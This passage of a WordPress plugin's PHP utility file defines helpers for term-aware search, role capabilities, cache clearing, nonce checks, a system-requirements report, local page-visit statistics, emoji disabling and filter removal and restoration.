		return $join;
	}
}

if ( ! function_exists( 'trx_addons_allow_search_for_terms_posts_where' ) ) {
	/**
	 * Add handlers to allow to search for terms while a keywords search started
	 * 
	 * @hooked posts_where
	 * 
	 * @param string $where    A string with a query clause 'WHERE'
	 * @param WP_Query $query  A query object
	 * 
	 * @return string          A modified WHERE clause
	 */
	function trx_addons_allow_search_for_terms_posts_where( $where, $query ) {
		global $wpdb;

		if ( ! empty( $query ) && ! empty( $query->query_vars['s'] ) ) {
			if ( strpos( $where, "OR {$wpdb->terms}.name LIKE" ) === false ) {
				$escaped_s = esc_sql( $query->query_vars['s'] );
				if ( strpos( $where, "OR {$wpdb->terms}.name LIKE '%{$escaped_s}%'" ) === false ) {
					$where .= " OR {$wpdb->terms}.name LIKE '%{$escaped_s}%'";
				}
			}
		}

		return $where;
	}
}

if ( ! function_exists( 'trx_addons_allow_search_for_terms_posts_groupby' ) ) {
	/**
	 * Add handlers to allow to search for terms while a keywords search started
	 * 
	 * @hooked posts_groupby
	 * 
	 * @param string $groupby  A string with a query clause 'LEFT groupby'
	 * @param WP_Query $query  A query object
	 * 
	 * @return string          A modified GROUPBY clause
	 */
	function trx_addons_allow_search_for_terms_posts_groupby( $groupby, $query ) {
		global $wpdb;

		$groupby = "{$wpdb->posts}.ID";

		do_action( 'trx_addons_action_remove_terms_from_search' );

		return $groupby;
	}
}


/* Capabilities
------------------------------------------------------------------------------------- */

if ( ! function_exists('trx_addons_get_capabilities') ) {
	/**
	 * Return the list of capabilities for the specified post type
	 * 
	 * @param string $type  Post type
	 * 
	 * @return array 	  List of capabilities
	 */
	function trx_addons_get_capabilities( $type ) {
		return array(
				// Post type
				"edit_{$type}",
				"read_{$type}",
				"delete_{$type}",

				"edit_{$type}s",
				"edit_private_{$type}s",
				"edit_published_{$type}s",
				"edit_others_{$type}s",

				"publish_{$type}s",

				"read_private_{$type}s",

				"delete_{$type}s",
				"delete_private_{$type}s",
				"delete_published_{$type}s",
				"delete_others_{$type}s",

				// Terms
				"manage_{$type}_terms",
				"edit_{$type}_terms",
				"delete_{$type}_terms",
				"assign_{$type}_terms",
			);
	}
}

if ( ! function_exists('trx_addons_add_capabilities') ) {
	/**
	 * Add capabilities to the specified roles
	 * 
	 * @param array $roles    List of roles
	 * @param array $types    List of post types
	 * @param array $disallow List of capabilities to disallow
	 */
	function trx_addons_add_capabilities( $roles, $types, $disallow=array() ) {
		foreach( (array) $roles as $role ) {
			$caps = get_role( $role );
			if ( is_object( $caps ) ) {
				foreach( (array) $types as $type ) {
					foreach( trx_addons_get_capabilities( $type ) as $cap ) {
						$allow = true;
						foreach( $disallow as $dis ) {
							if ( strpos( $cap, $dis ) !== false
								|| ( strpos( $dis, '%s' ) !== false && strpos( $cap, sprintf( $dis, $type ) ) !== false )
							) {
								$allow = false;
								break;
							}
						}
						if ( $allow ) {
							$caps->add_cap( $cap );
						}
					}
				}
			}
		}
	}
}

if ( ! function_exists('trx_addons_remove_capabilities') ) {
	/**
	 * Remove capabilities from the specified roles
	 * 
	 * @param array $roles List of roles
	 * @param array $types List of post types
	 */
	function trx_addons_remove_capabilities( $roles, $types ) {
		foreach( (array) $roles as $role ) {
			$caps = get_role( $role );
			if ( is_object( $caps ) ) {
				foreach( (array) $types as $type ) {
					foreach( trx_addons_get_capabilities( $type ) as $cap ) {
						$caps->remove_cap( $cap );
					}
				}
			}
		}
	}
}

	
/* WP cache
------------------------------------------------------------------------------------- */

if ( ! function_exists('trx_addons_clear_cache') ) {
	/**
	 * Clear WP cache
	 *
	 * @param string $cc Cache component to clear (all|options|categories|menu)
	 */
	function trx_addons_clear_cache($cc) {
		if ( $cc == 'categories' || $cc == 'all' ) {
			wp_cache_delete('category_children', 'options');
			$taxes = get_taxonomies();
			if ( is_array( $taxes ) && count( $taxes ) > 0 ) {
				foreach ( $taxes  as $tax ) {
					delete_option( "{$tax}_children" );
					_get_term_hierarchy( $tax );
				}
			}
		} else if ( $cc == 'options' || $cc == 'all' ) {
			wp_cache_delete('alloptions', 'options');
		} else if ( $cc == 'menu' || $cc == 'all' ) {
			trx_addons_clear_menu_cache();
		}
		do_action( 'trx_addons_action_clear_cache', $cc );
		if ( $cc == 'all' ) {
			wp_cache_flush();
		}
	}
}


	
/* AJAX utilities
------------------------------------------------------------------------------------- */

if ( ! function_exists( 'trx_addons_verify_nonce' ) ) {
	/**
	 * Verify nonce and exit if it's not valid
	 * 
	 * @param string $nonce Nonce name
	 * @param string $mask  Nonce mask
	 */
	function trx_addons_verify_nonce( $nonce = 'nonce', $mask = '' ) {
		if ( empty( $mask ) ) {
			$mask = admin_url('admin-ajax.php');
		}
		if ( ! wp_verify_nonce( trx_addons_get_value_gp( $nonce ), $mask ) ) {
			trx_addons_forbidden();
		}
	}
}

if ( ! function_exists( 'trx_addons_exit' ) ) {
	/**
	 * Exit with code
	 * 
	 * @param string $message Message to show. Default - empty
	 * @param string $title   Title of the message. Default - empty
	 * @param int    $code    Code of the message. Default - 200
	 */
	function trx_addons_exit( $message = '', $title = '', $code = 200 ) {
		wp_die( $message, $title, array( 'response' => $code, 'exit' => empty( $message ) && empty( $title ) ) );
	}
}

if ( ! function_exists( 'trx_addons_forbidden' ) ) {
	/**
	 * Exit with code 403
	 * 
	 * @param string $message Message to show. Default - empty
	 * @param string $title   Title of the message. Default - empty
	 */
	function trx_addons_forbidden( $message = '', $title = '' ) {
		trx_addons_exit( $message, $title, 403 );
	}
}

if ( ! function_exists( 'trx_addons_ajax_response' ) ) {
	/**
	 * Return AJAX response and exit
	 * 
	 * @param array $response Response data
	 */
	function trx_addons_ajax_response( $response ) {
		echo wp_json_encode( $response );
		wp_die( '', '', array( 'exit' => true ) );
	}
}


	
/* Other utilities
------------------------------------------------------------------------------------- */

if ( ! function_exists( 'trx_addons_get_theme_info' ) ) {
	/**
	 * Return theme info
	 *
	 * @param bool $cache If true (default) - get info from cache
	 * 
	 * @return array Theme info array. Keys: theme_slug, theme_name, theme_version, theme_activated, theme_categories, theme_plugins, etc.
	 */
	function trx_addons_get_theme_info( $cache = true ) {
		static $cached_info = false;
		if ( $cached_info !== false ) {
			$theme_info = $cached_info;
		} else {
			$theme_slug = get_template();
			$theme = wp_get_theme( $theme_slug );
			//Data below required for the 'Dashboard Widget' to display theme- and category-relevant news
			$theme_info = apply_filters('trx_addons_filter_get_theme_info', array(
				'theme_slug' => $theme_slug,
				'theme_name' => $theme->get( 'Name' ),
				'theme_version' => $theme->get( 'Version' ),
				'theme_activated' => '',
				'theme_pro_key' => '',
				'theme_page_url' => function_exists( 'menu_page_url' ) ? menu_page_url( 'trx_addons_theme_panel', false ) : '',
				'theme_categories' => '',
				'theme_plugins' => '',
				'theme_feed' => array(),
				'theme_actions' => array(),
				)
			);
			$theme_pro_key = get_option( sprintf( 'purchase_code_src_%s', $theme_slug ) );
			if ( $theme_pro_key ) {
				$theme_info['theme_pro_key'] = $theme_pro_key;
			}
			if ( $cache ) {
				$cached_info = $theme_info;
			}
		}
		return $theme_info;
	}
}

if ( ! function_exists('trx_addons_get_sys_info') ) {
	/**
	 * Return system info array 
	 */
	function trx_addons_get_sys_info() {
		global $wpdb;
		$php_memory_limit           = trx_addons_size2num( @ini_get( 'memory_limit' ) );
		$php_memory_limit_rec       = ( function_exists( 'trx_addons_exists_bbpress' ) && trx_addons_exists_bbpress() ? 128 : 96) * 1024 * 1024;
		$php_post_max_size          = trx_addons_size2num( @ini_get( 'post_max_size' ) );
		$php_post_max_size_rec      = 32 * 1024 * 1024;
		$php_max_upload_size        = wp_max_upload_size();
		$php_max_upload_size_rec    = 32 * 1024 * 1024;
		$php_max_input_vars         = @ini_get( 'max_input_vars' );
		$php_max_input_vars_rec     = 1000;
		$php_max_execution_time     = @ini_get( 'max_execution_time' );
		$php_max_execution_time_rec = 300;
		$php_required_version       = '7.0';
		$wp_required_version        = '5.0';
		// Check a directory 'uploads' to write access
		$wp_uploads_writable        = false;
		$tmp_name = 'tmp-' . mt_rand() . '.txt';
		$tmp = wp_upload_bits( $tmp_name, 0, $tmp_name );
		if ( empty( $tmp['error'] ) && ! empty( $tmp['file'] ) && file_exists( $tmp['file'] ) ) {
			$tmp_val = trx_addons_fgc( $tmp['file'] );
			$wp_uploads_writable = $tmp_val == $tmp_name;
			unlink( $tmp['file'] );
		}
		return apply_filters('trx_addons_filter_get_sys_info', array(
					// Checked params
					'wp_version' => array(
												'title' => __('WP version', 'trx_addons'),
												'description' => __( 'The version of WordPress installed on your site.', 'trx_addons' ),
												'value' => get_bloginfo( 'version' ),
												'recommended' => "{$wp_required_version}+",
												'checked' => version_compare( get_bloginfo( 'version' ), $wp_required_version, '>=' ),
												),
					'wp_uploads_writable' => array(
												'title' => __('WP uploads directory writable', 'trx_addons'),
												'description' => __( 'The directory must be writable to allow demo data upload, plugin and skin updates, etc.', 'trx_addons' ),
												'value' => $wp_uploads_writable ? esc_html__( 'Yes', 'trx_addons' ) : esc_html__( 'No', 'trx_addons' ),
												'recommended' => esc_html__( 'Yes', 'trx_addons' ),
												'checked' => $wp_uploads_writable,
												),
					'php_version' => array(
												'title' => __('PHP version', 'trx_addons'),
												'description' => __( 'The version of PHP installed on your hosting server.', 'trx_addons' ),
												'value' => phpversion(),
												'recommended' => "{$php_required_version}+",
												'checked' => version_compare( phpversion(), $php_required_version, '>=' ),
												),
					'php_memory_limit' => array(
												'title' => __('PHP Memory Limit', 'trx_addons'),
												'description' => __( 'The maximum amount of memory (RAM) that your site can use at one time.', 'trx_addons' ),
												'value' => size_format( $php_memory_limit ),
												'recommended' => size_format( $php_memory_limit_rec ),
												'checked' => $php_memory_limit >= $php_memory_limit_rec,
												),
					'php_post_maxsize' => array(
												'title' => __('PHP Post Max Size', 'trx_addons'),
												'description' => __( 'The largest filesize that can be contained in one post.', 'trx_addons' ),
												'value' => size_format( $php_post_max_size ),
												'recommended' => size_format( $php_post_max_size_rec ),
												'checked' => $php_post_max_size >= $php_post_max_size_rec,
												),
					'php_max_upload_size' => array(
												'title' => __('PHP Max Upload Size', 'trx_addons'),
												'description' => __( 'The largest filesize that can be uploaded to your WordPress installation.', 'trx_addons' ),
												'value' => size_format( $php_max_upload_size ),
												'recommended' => size_format( $php_max_upload_size_rec ),
												'checked' => $php_max_upload_size >= $php_max_upload_size_rec,
												),
					'php_max_input_vars' => array(
												'title' => __('PHP Max Input Vars', 'trx_addons'),
												'description' => __( 'The maximum number of variables your server can use for a single function to avoid overloads.', 'trx_addons' ),
												'value' => $php_max_input_vars,
												'recommended' => $php_max_input_vars_rec . '+',
												'checked' => $php_max_input_vars >= $php_max_input_vars_rec,
												),
					'php_max_execution_time' => array(
												'title' => __('PHP Max Execution Time (sec)', 'trx_addons'),
												'description' => __( 'The amount of time (in seconds) that your site will spend on a single operation before timing out (to avoid server lockups).', 'trx_addons' ),
												'value' => $php_max_execution_time,
												'recommended' => $php_max_execution_time_rec . '+',
												'checked' => $php_max_execution_time >= $php_max_execution_time_rec,
												),
					// Info (not checked) params
					'wp_memory_limit'  => array(
												'title' => __('WP Memory limit', 'trx_addons'),
												'description' => __( 'The maximum amount of memory (RAM) that your site can use at one time.', 'trx_addons' ),
												'value' => defined('WP_MEMORY_LIMIT') ? size_format( trx_addons_size2num( WP_MEMORY_LIMIT ) ) : __('not set', 'trx_addons'),
												'recommended' => '',	//size_format( 128 * 1024 * 1024 ),
												),
					'mysql_version'  => array(
												'title' => __('MySQL version', 'trx_addons'),
												'description' => __( 'The version of MySQL installed on your hosting server.', 'trx_addons' ),
												'value' => ( ! empty( $wpdb->is_mysql ) ? $wpdb->db_version() : '' ),
												'recommended' => '',
												),
					));
	}
}

if ( ! function_exists('trx_addons_get_privacy_text') ) {
	/**
	 * Return text for Privacy Policy link
	 */
	function trx_addons_get_privacy_text() {
		$page = get_option('wp_page_for_privacy_policy');
		return apply_filters( 'trx_addons_filter_privacy_text',
					wp_kses( 
						__( 'I agree that my submitted data is being collected and stored.', 'trx_addons' )
						. ( '' != $page
							// Translators: Add url to the Privacy Policy page
							? ' ' . sprintf(__('For further details on handling user data, see our %s', 'trx_addons'),
									'<a href="' . esc_url(get_permalink($page)) . '" target="_blank">'
										. __('Privacy Policy', 'trx_addons')
									. '</a>') 
							: ''
							),
						'trx_addons_kses_content'
					)
				);
	}
}



/* Site statistics
-------------------------------------------------------------------------------- */

if ( ! function_exists('trx_addons_statistics_save_visit') ) {
	add_action( 'wp', 'trx_addons_statistics_save_visit' );
	/**
	 * Save visit to the site to the log
	 * 
	 * @hooked action wp
	 */
	function trx_addons_statistics_save_visit() {
		if ( is_admin() || wp_doing_ajax() || wp_doing_cron()
			|| trx_addons_is_preview()
			|| ! apply_filters( 'trx_addons_filter_save_site_visits', true )
			|| ( apply_filters( 'trx_addons_filter_save_site_visits_only_for_cache', false )
				&& ( ! trx_addons_is_on( trx_addons_get_option( 'layouts_cache' ) ) || ! trx_addons_is_on( trx_addons_get_option( 'layouts_cache_popular' ) ) )
				)
		) {
			return;
		}
		$url = trx_addons_get_current_url();
		if ( ( strpos( $url, '?s=' ) === false && strpos( $url, '&s=' ) === false ) || apply_filters( 'trx_addons_filter_save_visit_from_search', false ) ) {
			$url_hash = md5( $url );
			// Load visits
			//$visits = get_option( 'trx_addons_site_visits', false );
			$visits = trx_addons_cache_get_storage( 'trx_addons_site_visits' );
			if ( ! $visits || ! is_array($visits) ) {
				$visits = array();
			}
			if ( empty( $visits[$url_hash] ) ) {
				$visits[$url_hash] = array(
					'url' => $url,
					'count' => 0
				);
			}
			$visits[$url_hash]['title'] = trx_addons_get_blog_title();
			$visits[$url_hash]['count']++;
			uasort( $visits, 'trx_addons_statistics_compare' );
			// Save visits
			//update_option( 'trx_addons_site_visits', $visits );
			trx_addons_cache_put_storage( 'trx_addons_site_visits', $visits );
		}
	}
}

if ( ! function_exists( 'trx_addons_statistics_clear_visits' ) ) {
	add_action( 'trx_addons_action_just_save_options', 'trx_addons_statistics_clear_visits' );
	/**
	 * Clear a log with site visits when save plugin and/or theme options if a cache if off or a cache for popular layouts is off
	 * 
	 * @hooked trx_addons_action_just_save_options
	 */
	function trx_addons_statistics_clear_visits() {
		if ( ! apply_filters( 'trx_addons_filter_save_site_visits', true ) 
			|| ( apply_filters( 'trx_addons_filter_save_site_visits_only_for_cache', false )
				&& ( ! trx_addons_is_on( trx_addons_get_option( 'layouts_cache' ) ) || ! trx_addons_is_on( trx_addons_get_option( 'layouts_cache_popular' ) ) )
				)
		) {
			//update_option( 'trx_addons_site_visits', false );
			trx_addons_cache_delete_storage( 'trx_addons_site_visits' );
		}
	}
}

if ( ! function_exists('trx_addons_statistics_get_info') ) {
	/**
	 * Return site visits statistic for the specified URL
	 * 
	 * @param string $url		URL to get Statistic. If empty - return current page statistic. If '*' - return all statistic
	 * 
	 * @return array			Statistic
	 */
	function trx_addons_statistics_get_info( $url='' ) {
		if ( empty( $url ) ) {
			$url = trx_addons_get_current_url();
		}
		$url_hash = md5( $url );
		$visits = array();
		if ( apply_filters( 'trx_addons_filter_save_site_visits', true ) ) {
			//$visits = get_option( 'trx_addons_site_visits', false );
			$visits = trx_addons_cache_get_storage( 'trx_addons_site_visits' );
		}
		if ( $url == '*' ) {
			return $visits;
		} else {
			$rez = array(
				'count' => 1,
				'url'   => $url,
				'hash'  => $url_hash
			);
			if ( ! empty( $visits[ $url_hash ] ) ) {
				$rez = $visits[ $url_hash ];
				$rez['hash']  = $url_hash;
				$rez['total'] = count( $visits );
				$rez['index'] = array_search( $url_hash, array_keys( $visits ) );
			} else {
				$rez['total'] = is_array( $visits ) ? max( 1, count( $visits ) ) : 1;
				$rez['index'] = $rez['total'] - 1;
			}
			return $rez;
		}
	}
}

if ( ! function_exists('trx_addons_statistics_get_top_visited') ) {
	/**
	 * Return a top N most visited pages
	 * 
	 * @return array  Top visited pages
	 */
	function trx_addons_statistics_get_top_visited( $n = 10 ) {
		$visits = array();
		if ( apply_filters( 'trx_addons_filter_save_site_visits', true ) ) {
			//$visits = get_option( 'trx_addons_site_visits', false );
			$visits = trx_addons_cache_get_storage( 'trx_addons_site_visits' );
			if ( is_array( $visits ) ) {
				$summ = 0;
				foreach( $visits as $v ) {
					$summ += ! empty( $v['count'] ) ? $v['count'] : 0;
				}
				foreach( $visits as $k => $v ) {
					$visits[$k]['percent'] = round( 100 * ( ! empty( $v['count'] ) ? $v['count'] : 0 ) / $summ, 0 );
				}
			}
		}
		return is_array( $visits ) ? array_slice( $visits, 0, $n ) : array();
	}
}

if ( ! function_exists('trx_addons_statistics_compare') ) {
	/**
	 * Compare two statistics entries (reverse order)
	 * 
	 * @param array $a	First entry
	 * @param array $b	Second entry
	 */
	function trx_addons_statistics_compare( $a, $b ) {
		return $a['count'] > $b['count']
				? -1
				: ( $a['count'] < $b['count']
					? 1
					: 0
					);
	}
}

if ( ! function_exists( 'trx_addons_statistics_importer_export_options' ) ) {
	add_filter( 'trx_addons_filter_export_options', 'trx_addons_statistics_importer_export_options' );
	/**
	 * Clear a site visits statistic before export
	 * 
	 * @hooked filter trx_addons_filter_export_options
	 *
	 * @param array $options	Export options
	 * 
	 * @return array 			Modified export options
	 */
	function trx_addons_statistics_importer_export_options( $options ) {
		if ( ! empty( $options['trx_addons_site_visits'] ) ) {
			$options['trx_addons_site_visits'] = '';
		}
		return $options;
	}
}



/* Disable Emojis
-------------------------------------------------------------------------------- */

if ( ! function_exists( 'trx_addons_emoji_disable' ) ) {
	add_action( 'init', 'trx_addons_emoji_disable' );
	/**
	 * Disable Emojis
	 * 
	 * @hooked action init
	 */
	function trx_addons_emoji_disable() {
		if ( (int) trx_addons_get_option( 'disable_emoji' ) > 0 ) {
			remove_action( 'wp_head',             'print_emoji_detection_script', 7 );
			remove_action( 'embed_head',          'print_emoji_detection_script' );
			remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
			remove_filter( 'the_content_feed',    'wp_staticize_emoji' );
			remove_filter( 'comment_text_rss',    'wp_staticize_emoji' );
			remove_filter( 'wp_mail',             'wp_staticize_emoji_for_email' );
			remove_action( 'wp_print_styles',     'print_emoji_styles' );
			remove_action( 'admin_print_styles',  'print_emoji_styles' );
			add_filter(    'tiny_mce_plugins',    'trx_addons_emoji_disable_for_tinymce' );
			add_filter(    'wp_resource_hints',   'trx_addons_emoji_remove_dns_prefetch', 10, 2 );
			if ( (int) get_option( 'use_smilies' ) == 1 ) {
				update_option( 'use_smilies', '0' );
			}
		}
	}
}

if ( ! function_exists( 'trx_addons_emoji_disable_for_tinymce' ) ) {
	/**
	 * Disable Emojis in TinyMCE
	 * 
	 * @param array $plugins  List of TinyMCE plugins
	 * 
	 * @return array          Modified list of TinyMCE plugins (without 'wpemoji')
	 */
	function trx_addons_emoji_disable_for_tinymce( $plugins = array() ) {
		return is_array( $plugins )
				? array_diff( $plugins, array( 'wpemoji' ) )
				: array();
	}
}

if ( ! function_exists( 'trx_addons_emoji_remove_dns_prefetch' ) ) {
	/**
	 * Remove emoji CDN hostname from DNS prefetching hints.
	 * 
	 * @param array  $urls          URLs to print for resource hints.
	 * @param string $relation_type The relation type the URLs are printed for.
	 * 
	 * @return array                Difference betwen the two arrays.
	 */
	function trx_addons_emoji_remove_dns_prefetch( $urls, $relation_type ) {
		if ( $relation_type == 'dns-prefetch' ) {
			$emoji_svg_url = apply_filters( 'emoji_svg_url', 'https://s.w.org/images/core/emoji/11/svg/' );
			$urls          = array_diff( $urls, array( $emoji_svg_url ) );
		}
		return $urls;
	}
}



/* WordPress filters manipulations
-------------------------------------------------------------------------------- */

if ( ! function_exists( 'trx_addons_remove_filter' ) ) {
	/**
	 * Remove filter from the specified hook by method name and return old settings
	 *
	 * @param string $filter_name		Filter name
	 * @param string $callback_name		Callback name
	 * @param string $class_name		Class name
	 * 
	 * @return array					Old (removed) settings
	 */
	function trx_addons_remove_filter( $filter_name, $callback_name, $class_name = '' ) {
		global $wp_filter;
		$rez = false;
		if ( ! empty( $wp_filter[ $filter_name ] ) && ( is_array( $wp_filter[ $filter_name ] ) || is_object( $wp_filter[ $filter_name ] ) ) ) {
			foreach ( $wp_filter[ $filter_name ] as $p => $cb ) {
				foreach ( $cb as $k => $v ) {
					if ( strpos( $k, $callback_name ) !== false
						&& ( empty( $class_name )
							|| ! is_array( $v['function'] )
							|| ! is_object( $v['function'][0] )
							// This way needs for the full class name (with namespace)
							|| get_class( $v['function'][0] ) == $class_name
							// This way compare a class name with a last portion of the full class name
							//|| substr( get_class( $v['function'][0] ), strlen( $class_name ) ) == $class_name
							)
					) {
						$rez = array(
							'filter'   => $filter_name,
							'key'      => $k,
							'callback' => $v,
							'priority' => $p
						);
						remove_filter( $filter_name, $v['function'], $p );
					}
				}
			}
		}
		return $rez;
	}
}

if ( ! function_exists( 'trx_addons_remove_action' ) ) {
	/**
	 * Remove action from the specified hook by method name and return old settings
	 *
	 * @param string $filter_name		Filter name
	 * @param string $callback_name		Callback name
	 * @param string $class_name		Class name
	 * 
	 * @return array					Old (removed) settings
	 */
	function trx_addons_remove_action( $filter_name, $callback_name, $class_name = '' ) {
		return trx_addons_remove_filter( $filter_name, $callback_name, $class_name );
	}
}

if ( ! function_exists( 'trx_addons_restore_filter' ) ) {
	/**
	 * Restore filter to the specified hook by old settings returned by trx_addons_remove_filter
	 *
	 * @param array $filter		Old (removed) settings of the filter to restore
	 */
	function trx_addons_restore_filter( $filter ) {
		global $wp_filter;
		if ( ! empty( $filter['filter'] ) ) {
			$filter_name     = $filter['filter'];
			$filter_key      = $filter['key'];
			$filter_callback = $filter['callback'];
			$filter_priority = $filter['priority'];
			if ( ! isset( $wp_filter[ $filter_name ][ $filter_priority ][ $filter_key ] ) ) {
				add_filter( $filter_name, $filter_callback['function'], $filter_priority, $filter_callback['accepted_args'] );
			}
		}
	}
}

if ( ! function_exists( 'trx_addons_restore_action' ) ) {
	/**
	 * Restore action to the specified hook by old settings returned by trx_addons_remove_action
	 *
	 * @param array $filter		Old (removed) settings of the action to restore
	 */
	function trx_addons_restore_action( $filter ) {
		return trx_addons_restore_filter( $filter );
	}
}
